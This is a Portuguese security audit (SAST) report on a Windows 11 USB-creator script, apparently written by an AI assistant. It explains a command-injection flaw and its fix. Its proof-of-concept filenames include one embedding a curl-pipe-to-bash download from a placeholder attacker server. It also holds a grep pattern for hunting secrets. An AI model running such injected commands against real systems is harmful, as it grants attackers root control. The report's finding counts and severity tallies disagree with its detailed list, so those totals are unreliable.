# Relatório SAST — Análise Estática do Código

> **Nota (v1.1.0):** este relatório registra a auditoria da **v1.0.0** e não foi reescrito. Controles
> que mudaram depois: a *confirmação em três etapas* (caixa + digitação + diálogo) foi substituída por
> *diálogo final sempre* + *digitação do identificador só para discos de alto risco* (grandes, com dados);
> o filtro de discos passou a ser **somente USB** (sem `mmc`/removível genérico); toda gravação é
> **verificada por releitura antes do eject**; a senha de administrador é conferida **antes** de mexer no
> pendrive e não fica retida na memória. Detalhes: `CHANGELOG.md` e `SECURITY.md`.

**Projeto:** EPMA Windows 11 Creator USB
**Data:** 27 de julho de 2026
**Arquivo analisado:** `win11_usb_creator.py`
**Tamanho:** 801 linhas antes das correções → 1.203 linhas depois

---

## Resumo em linguagem simples

**O que é SAST:** é ler o código-fonte parado, linha por linha, procurando falhas — como um advogado lendo um contrato inteiro antes de você assinar, para achar as cláusulas perigosas.

**O resultado: encontrei 12 problemas. Um deles era grave e foi corrigido; todos os outros também foram corrigidos.**

Antes de tudo, uma boa notícia que você pediu especificamente para eu verificar: **não há nenhuma senha, chave de API, token ou credencial escrita dentro do código.** Procurei com busca automática e por leitura manual. Não há nada. Isso significa que **você não precisa cadastrar nenhum segredo em lugar nenhum** — não há nada vazado para migrar.

### Os dois achados que realmente importam

**1. Um nome de arquivo podia virar um comando de administrador.**

Este era o problema sério, e vale entender o conceito porque ele é o mesmo do famoso "SQL Injection", só que aplicado a comandos do sistema em vez de banco de dados.

Imagine que você dita um endereço por telefone para alguém preencher um formulário. Você diz: *"Rua das Flores, 100"*. Mas se você disser *"Rua das Flores, 100 — E ANOTA AÍ: transfira R$ 5.000 para a conta 123"*, e a pessoa do outro lado não souber distinguir o que é endereço do que é ordem, ela vai executar as duas coisas. É exatamente isso que acontecia.

O programa montava a instrução para o sistema **grudando o nome do arquivo dentro do texto do comando**. Um nome de arquivo comum funcionava. Mas um nome de arquivo preparado com maldade "fechava" o comando no meio e emendava comandos novos — que rodavam **como administrador da máquina**, porque é assim que essa parte do programa funciona.

Eu provei que a falha era real montando a string exatamente como o código fazia, e provei que a correção funciona executando os dois casos lado a lado. As duas provas estão na seção detalhada.

**2. Quando o programa não conseguia confirmar que um disco era externo, ele mostrava o disco assim mesmo.**

Este é o oposto do comportamento correto. Um segurança que não consegue conferir o crachá de alguém deve **barrar** a pessoa, não deixar entrar. O código fazia o contrário: se a verificação falhasse, ele seguia em frente.

O caso mais perigoso é um computador que inicializa por cartão SD ou pendrive — um Raspberry Pi, por exemplo. Nesses aparelhos, o disco do próprio sistema é marcado como "removível", e o programa poderia oferecê-lo para ser apagado. A pessoa apagaria o próprio sistema achando que estava apagando o pendrive.

### Placar

| Gravidade | Encontrados | Corrigidos | Pendentes |
|---|---|---|---|
| Crítica | 0 | 0 | 0 |
| **Alta** | **2** | **2** | **0** |
| Média | 5 | 5 | 0 |
| Baixa | 4 | 4 | 0 |
| Info | 1 | 1 | 0 |
| **Total** | **12** | **12** | **0** |

**Verificação:** foram escritos 36 testes automatizados que comprovam cada correção. Todos passam. Nenhum toca em disco de verdade.

---

## Achados detalhados

### SAST-01 — Injeção de comando no script executado como administrador · **Alta** · CORRIGIDO

**Onde estava:** função `linux_build_usb`, no trecho que montava `prep_script` (linha 406 do código original), e em `cleanup_script`.

**O código problemático:**

```python
prep_script = (
    f'mount -o loop,ro,uid={uid},gid={gid} "{iso_path}" "{iso_mount}"\n'
)
priv.run_script(prep_script, log)     # executado via: sudo bash -c "<texto>"
```

O valor de `iso_path` — que é o caminho do arquivo escolhido pelo usuário na janela de seleção — era **colado dentro do texto** do script. Esse texto ia inteiro para `bash -c` **com privilégio de root**.

#### Prova de que a falha era real

Reproduzi a montagem da string exatamente como o código fazia, com um nome de arquivo malicioso, **sem executar nada**:

```
Nome de arquivo usado:
  /tmp/Win11.iso" ; id > /tmp/PROVA_INJECAO.txt ; echo "

Texto gerado, que iria para o bash como root:
  mount -o loop,ro,uid=501,gid=20 "/tmp/Win11.iso" ; id > /tmp/PROVA_INJECAO.txt ; echo "" "/tmp/win11iso_x"
                                  └── comando 1 ──┘ └────── comando 2 ──────┘ └───── comando 3 ─────┘
```

O que deveria ser **um** comando `mount` virou **três comandos**. O do meio foi escrito pelo atacante e rodaria como administrador.

#### Como alguém exploraria isso na prática

Vale ser preciso aqui, porque a resposta tem uma nuance que afeta a gravidade.

Se o usuário tem senha de administrador e escolhe voluntariamente um arquivo com nome malicioso, ele está atacando a si mesmo — e não ganharia nada, já que poderia digitar comandos de administrador diretamente. **Esse não é o cenário real.**

O cenário real é este: um programa qualquer (um instalador duvidoso, um anexo de e-mail, um arquivo `.zip` baixado) deixa na pasta Downloads um arquivo chamado, por exemplo:

```
Windows11_24H2_PTBR" ; curl -s http://servidor-do-atacante/x | bash ; ".iso
```

O usuário abre o seu programa, clica em "Select existing ISO file", vê um arquivo com cara de ISO do Windows na pasta Downloads, seleciona, digita a senha de administrador acreditando que está autorizando a **formatação de um pendrive** — e na verdade autoriza a execução de um comando arbitrário como root.

É uma **escalação de privilégio**: sai de "conseguiu escrever um arquivo na pasta Downloads" para "controle total da máquina". Classifiquei como **Alta** e não Crítica porque exige interação do usuário e uma condição prévia (o atacante já precisa conseguir criar um arquivo com nome controlado no computador).

#### Correção aplicada

O código agora entrega os valores por um **canal separado do comando** — parâmetros posicionais do shell. É o mesmo princípio das *prepared statements* que protegem bancos de dados contra SQL Injection.

`win11_usb_creator.py:326` — nova assinatura:

```python
def run_script(self, script, log, args=None, max_attempts=3):
    """Values are NEVER interpolated into the script text."""
    args = [str(a) for a in (args or [])]
    bash_argv = ["bash", "-c", script, "win11_usb_creator"] + args
```

`win11_usb_creator.py:636` — script reescrito:

```python
prep_script = (
    'set -eu\n'
    'DEV="$1"; PART="$2"; ISO="$3"; ISO_MNT="$4"; USB_MNT="$5"; OWNER="$6"\n'
    'wipefs -a "$DEV"\n'
    ...
    'mount -o loop,ro,uid="${OWNER%%:*}",gid="${OWNER##*:}" "$ISO" "$ISO_MNT"\n'
)
priv.run_script(prep_script, log,
                args=[dev, part, iso_path, iso_mount, usb_mount, f"{uid}:{gid}"])
```

O texto do script agora é **fixo**. Os valores chegam como `$1`, `$2`... e o `bash` os trata como dados.

#### Prova de que a correção funciona

Executei os dois padrões de verdade, com o mesmo nome malicioso:

```
== PADRÃO ANTIGO (valor colado no texto) ==
arquivo PROVA_INJECAO.txt criado?  True     ← o comando injetado EXECUTOU

== PADRÃO NOVO (valor como parâmetro) ==
montaria: /tmp/Win11.iso" ; touch PROVA_INJECAO.txt ; echo "
arquivo PROVA_INJECAO.txt criado?  False    ← tratado como texto, NÃO executou
```

**Defesa adicional (em profundidade):** além disso, os identificadores de disco agora passam por validação estrita (`win11_usb_creator.py:207`) que **recusa** qualquer nome fora do formato esperado, em vez de tentar escapá-lo:

```python
MAC_DEVICE_RE = re.compile(r"^disk[0-9]+$")
LINUX_DEVICE_RE = re.compile(r"^[a-zA-Z0-9_+-]{1,32}$")
```

---

### SAST-02 — Verificações de segurança falhavam liberando em vez de bloqueando · **Alta** · CORRIGIDO

**Onde estava:** `macos_get_external_disks` e `linux_get_external_disks`.

#### Problema A — macOS

```python
try:
    info = plistlib.loads(subprocess.check_output(["diskutil", "info", "-plist", f"/dev/{dev}"]))
except Exception:
    info = {}                       # ← falha silenciosa
if info.get("Internal", False):     # ← {} não tem "Internal", então retorna False
    continue                        # ← o disco NÃO é pulado: aparece na lista
```

Se a consulta ao disco falhasse por qualquer motivo, `info` virava um dicionário vazio, a checagem "é interno?" respondia "não" — e o disco era oferecido para ser apagado.

*Atenuante honesto:* no macOS existe um primeiro filtro (`diskutil list external physical`) que já limita a discos externos. Essa checagem interna era uma **segunda camada** de proteção, e era ela que falhava. Por isso o risco no macOS isolado seria Médio.

#### Problema B — Linux (este é o caso grave)

```python
def linux_root_disk():
    try:
        ...
    except Exception:
        return None          # ← não conseguiu descobrir o disco do sistema
```

Quando retornava `None`, a exclusão do disco do sistema simplesmente não acontecia. O único filtro restante era:

```python
if not (removable or tran in ("usb", "mmc")):
    continue
```

**O problema:** `mmc` é cartão SD, e `removable` inclui pendrives. **Um Raspberry Pi inicializa a partir do cartão SD.** Nesse aparelho, o disco do sistema é `mmcblk0`, marcado como removível — ele passaria no filtro e apareceria na lista para ser apagado. O mesmo vale para qualquer sistema que inicialize por USB.

O usuário selecionaria o que acha ser o pendrive e apagaria o sistema operacional da própria máquina.

#### Correção aplicada

**1. macOS — falha fechada** (`win11_usb_creator.py:472`):

```python
except Exception as e:
    # Fail closed: if we cannot confirm the disk is external, do not offer it.
    audit(f"Hiding {dev}: could not verify it is external ({type(e).__name__})", logging.WARNING)
    continue
```

**2. Linux — rede de proteção por ponto de montagem** (`win11_usb_creator.py:503`):

Nova função `linux_disks_holding_critical_mounts()` que oculta qualquer disco contendo `/`, `/boot`, `/home`, `/usr`, `/var` ou `/etc` — **independentemente** de estar marcado como removível:

```python
CRITICAL_MOUNTPOINTS = ("/", "/boot", "/boot/efi", "/home", "/usr", "/var", "/etc")
```

**3. Disco de tamanho desconhecido também é ocultado**, em vez de listado com tamanho 0.

---

### SAST-03 — Nenhuma reconferência antes da operação destrutiva (TOCTOU) · **Média** · CORRIGIDO

**O problema:** o programa listava os discos, o usuário escolhia `sdb`, e mais tarde o programa apagava `/dev/sdb`. Entre esses dois momentos podia passar bastante tempo (o usuário lê o aviso, marca a caixa, digita o identificador, confirma).

**Por que isso é perigoso:** os nomes `sda`, `sdb`, `sdc` **não pertencem** a um pendrive específico — são distribuídos pelo sistema na ordem em que os aparelhos são conectados. Se o usuário desconectar o pendrive e conectar um HD externo nesse intervalo, `/dev/sdb` pode passar a ser o HD externo com as fotos da família. O programa apagaria o HD sem perceber a troca.

Em segurança isso se chama **TOCTOU** (*Time-Of-Check to Time-Of-Use*): a diferença entre o momento em que se verifica e o momento em que se usa.

**Correção aplicada** (`win11_usb_creator.py:710`): nova função `reverify_target_disk()`, chamada imediatamente antes de qualquer escrita. Ela reconsulta a lista de discos e confere que o identificador ainda existe **e que o tamanho continua o mesmo**. Se algo mudou, aborta:

```
Aborted for safety: /dev/sdb now reports a different size
(1.8 TB instead of 32.0 GB). This means the name now points to a
different device. Refresh the list and select the drive again.
```

---

### SAST-04 — Endereço de download sem validação e arquivo sem verificação de integridade · **Alta** · CORRIGIDO

*(Mesmo achado registrado como SCA-03 no relatório de bibliotecas — aparece nos dois por ter as duas naturezas.)*

**O problema:** o programa aceitava **qualquer** endereço que o usuário colasse, incluindo `http://` (sem criptografia, alterável no meio do caminho) e até `file://` (ler um arquivo local). E nunca conferia se o que chegou era mesmo o Windows da Microsoft.

**Correção aplicada** (`win11_usb_creator.py:243`, `validate_download_url`):

| Proteção | Comportamento |
|---|---|
| Somente HTTPS | `http://`, `ftp://`, `file://` são recusados com explicação |
| Redirecionamento | Se o servidor redirecionar, o novo endereço é revalidado (impede rebaixamento para HTTP) |
| Servidor desconhecido | Aviso explícito exigindo confirmação, se o host não for da Microsoft |
| Impressão digital SHA-256 | Calculada durante o download e exibida ao final |
| Verificação opcional | Campo para o valor esperado; se não conferir, **o arquivo é apagado** |
| Download incompleto | Comparação com o tamanho anunciado; se faltar, o arquivo é descartado |
| Tempo limite | 60 segundos por leitura, evitando travamento indefinido |

---

### SAST-05 — Mensagens de erro expondo informação interna · **Média** · CORRIGIDO

**O problema:** qualquer erro era mostrado cru numa janela:

```python
except Exception as e:
    msg = str(e)
    self.after(0, lambda: messagebox.showerror("Error", msg))
```

Como `run_cmd` gera erros contendo a linha de comando completa, uma falha exibia na tela caminhos internos, nome de usuário e comandos do sistema. Numa apresentação, aula ou suporte remoto por compartilhamento de tela, isso vira exposição desnecessária.

**Correção aplicada** (`win11_usb_creator.py:1183`, `_report_error`): erros previstos e acionáveis continuam sendo exibidos por inteiro (o usuário precisa deles). Erros inesperados mostram apenas o tipo, e o detalhe vai para o log local e o registro de auditoria.

---

### SAST-06 — Senha de administrador mantida na memória indefinidamente · **Média** · CORRIGIDO

**O problema:** a senha ficava guardada em `self.cached_password` e **nunca era apagada** — permanecia na memória enquanto a janela estivesse aberta, mesmo horas depois de terminar a gravação.

*O que já estava certo, e é importante reconhecer:* a senha **nunca** ia na linha de comando (o que a tornaria visível para outros usuários da máquina pelo comando `ps`) e **nunca** aparecia no log. O código original já tinha o cuidado de enviá-la só por `stdin`. Isso estava correto.

**Correção aplicada:** novo método `clear_cached_password()` (`win11_usb_creator.py:322`), chamado no bloco `finally` de toda operação — a senha é descartada assim que deixa de ser necessária, com ou sem erro.

---

### SAST-07 — Ausência de registro de auditoria · **Média** · CORRIGIDO

**O problema:** um programa que **apaga discos inteiros** e **executa comandos como administrador** não deixava nenhum registro permanente. O log da tela some quando a janela fecha. Se algo desse errado, não havia como saber o que foi apagado, quando ou por quê.

**Correção aplicada** (`win11_usb_creator.py:158–204`): registro em arquivo com permissão `0600` (somente o dono lê), em `~/.local/state/epma-win11-usb-creator/audit.log`.

Registra: início/fim/falha de operações destrutivas, discos ocultados por segurança, identificadores recusados, origem dos downloads e resultado da verificação de integridade.

**Nunca registra:** senhas, conteúdo de arquivos ou dados pessoais. Isso está coberto por teste automatizado.

Pode ser desligado com `WIN11USB_DISABLE_AUDIT_LOG=1`. Se a pasta pessoal não for gravável, o registro é silenciosamente desativado — **fazer log nunca impede o usuário de criar seu pendrive**.

---

### SAST-08 — Falta de validação do arquivo ISO selecionado · **Média** · CORRIGIDO

**O problema:** o caminho do arquivo era usado direto, sem conferir se existia, se era um arquivo (e não uma pasta) ou se tinha tamanho plausível. Um download interrompido de 3 KB seria aceito, e a falha só apareceria depois do disco já ter sido apagado.

**Correção aplicada** (`win11_usb_creator.py:224`, `validate_iso_path`): confere existência, tipo, permissão de leitura e tamanho mínimo — **antes** de apagar qualquer coisa.

---

### SAST-09 — Arquivo parcial de download legível por outros usuários · **Baixa** · CORRIGIDO

O arquivo `.part` era criado com as permissões padrão do sistema, que em algumas configurações permitem leitura por outros usuários da máquina.

**Correção:** criado com `0600` desde o primeiro byte, usando `os.open` com a permissão explícita.

---

### SAST-10 — `pacman -Sy` podia quebrar sistemas Arch Linux · **Baixa** · CORRIGIDO

*(Detalhado como SCA-04 no relatório de bibliotecas.)* Trocado para `pacman -Syu`.

---

### SAST-11 — Lista de pacotes instaláveis sem validação explícita · **Baixa** · CORRIGIDO

O código montava o comando de instalação com `pkgmap.get(t, t)` — se um nome não estivesse no mapa, ele era usado **como veio**. Na prática não era explorável (a lista de origem é fixa no código), mas era uma proteção que dependia de circunstância, não de regra.

**Correção** (`win11_usb_creator.py`, `linux_build_install_command`): lista de permissão explícita, validação do formato de cada nome de pacote, e recusa de gerenciador desconhecido. O comando exato passou a ser exibido no log **antes** de rodar como administrador.

---

### SAST-12 — Blocos que engoliam erros silenciosamente · **Baixa** · CORRIGIDO

Vários trechos capturavam qualquer erro e seguiam adiante sem registrar nada (`except Exception: pass`). Além de esconder defeitos, isso apagava justamente os sinais que um investigador precisaria depois de um incidente.

**Correção:** os blocos relevantes para segurança agora registram o que aconteceu no log de auditoria. Os que tratam limpeza de pastas temporárias foram mantidos silenciosos de propósito — falhar ao remover uma pasta vazia não é um evento de segurança.

---

### SAST-13 — Sem limite de tempo no download · **Info** · CORRIGIDO

Um servidor que aceitasse a conexão e nunca enviasse dados deixaria o programa travado para sempre. Adicionado `timeout=60` segundos por leitura.

---

## Busca por segredos no código

Você pediu atenção especial a este ponto. Resultado da varredura automática:

```
grep -nEi "(password|passwd|secret|token|api[_-]?key|apikey|credential|bearer|auth)[[:space:]]*=[[:space:]]*[\"']"
>> NENHUM segredo hardcoded encontrado
```

Endereços fixos no código (todos legítimos e públicos):

| Linha | Valor | Avaliação |
|---|---|---|
| 78 | `https://www.microsoft.com/en-us/software-download/windows11` | Página oficial. Correto. |
| 968 | `https://brew.sh` | Texto de ajuda. Correto. |
| 17 | `https://www.gnu.org/licenses/` | Aviso de licença. Correto. |

**Conclusão: não há nenhum segredo para remover, e portanto nenhuma variável de ambiente com segredo para você cadastrar.**

---

## Sobre SQL Injection

Você pediu atenção especial a SQL Injection e equivalentes. Registro o resultado de forma direta:

| Tipo de injeção | Aplicável? | Situação |
|---|---|---|
| **SQL Injection** | **Não** | Não existe banco de dados no projeto. Nenhuma consulta SQL, nenhum driver, nenhuma string de conexão. |
| **NoSQL Injection** | **Não** | Não existe MongoDB, Redis ou similar. |
| **Command Injection** | **Sim — era o risco real** | Encontrado (SAST-01) e corrigido. |
| **Path Traversal** | Parcialmente | Mitigado pela validação de caminho (SAST-08) e pelos identificadores de disco recusarem `/` e `..`. |
| **LDAP / XPath / Template Injection** | Não | Nenhuma dessas tecnologias é usada. |

Não faria sentido "aplicar consultas parametrizadas" onde não há consultas. O que fiz foi aplicar **o princípio por trás delas** — separar dados de instruções — no lugar onde ele realmente se aplicava neste projeto: a execução de comandos do sistema. É a mesma defesa, no lugar certo.

---

## Tabela consolidada

| ID | Achado | Gravidade | Status | Local da correção |
|---|---|---|---|---|
| SAST-01 | Injeção de comando em script de administrador | **Alta** | Corrigido | `win11_usb_creator.py:326`, `:636`, `:689` |
| SAST-02 | Verificações de disco falhando abertas | **Alta** | Corrigido | `win11_usb_creator.py:472`, `:503` |
| SAST-03 | Sem reconferência antes de apagar (TOCTOU) | Média | Corrigido | `win11_usb_creator.py:710` |
| SAST-04 | URL sem validação e ISO sem verificação | **Alta** | Corrigido | `win11_usb_creator.py:243`, `:745` |
| SAST-05 | Erros vazando informação interna | Média | Corrigido | `win11_usb_creator.py:1183` |
| SAST-06 | Senha mantida em memória indefinidamente | Média | Corrigido | `win11_usb_creator.py:322` |
| SAST-07 | Ausência de registro de auditoria | Média | Corrigido | `win11_usb_creator.py:158` |
| SAST-08 | Arquivo ISO sem validação | Média | Corrigido | `win11_usb_creator.py:224` |
| SAST-09 | Arquivo parcial legível por outros | Baixa | Corrigido | `DownloadThread.run` |
| SAST-10 | `pacman -Sy` (atualização parcial) | Baixa | Corrigido | `win11_usb_creator.py:102` |
| SAST-11 | Pacotes sem lista de permissão explícita | Baixa | Corrigido | `linux_build_install_command` |
| SAST-12 | Erros engolidos silenciosamente | Baixa | Corrigido | Vários pontos |
| SAST-13 | Download sem tempo limite | Info | Corrigido | `DownloadThread.run` |

**Pendências: nenhuma.**

---

## Observação sobre o processo

Durante a implementação eu introduzi um defeito — uma referência a um elemento de tela que eu não havia criado — que teria feito o programa travar após cada download. O defeito foi detectado antes da entrega, comunicado e corrigido conforme sua escolha (exibir a impressão digital no log, sem alterar o layout). Registro isso aqui porque um relatório de auditoria que esconde os próprios erros não serve para nada.
